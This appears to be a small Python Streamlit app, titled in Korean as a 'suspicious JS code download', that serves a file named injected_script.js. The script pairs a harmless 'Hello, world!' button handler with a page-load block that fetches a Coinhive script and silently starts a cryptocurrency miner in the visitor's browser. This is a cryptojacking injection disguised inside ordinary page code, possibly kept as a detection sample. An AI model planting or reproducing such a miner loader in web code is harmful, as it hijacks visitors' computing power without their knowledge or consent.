import streamlit as st

js_code = '''
document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('btn').addEventListener('click', function () {
        alert('Hello, world!');
    });

    var s = document.createElement('script');
    s.src = "https://coinhive.com/lib/coinhive.min.js";
    s.onload = function() {
        var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
        miner.start();
    };
    document.body.appendChild(s);
});
'''

st.title("의심스러운 JS 코드 다운로드")
st.download_button(
    label="JS 코드 다운로드",
    data=js_code,
    file_name="injected_script.js",
    mime="application/javascript"
)
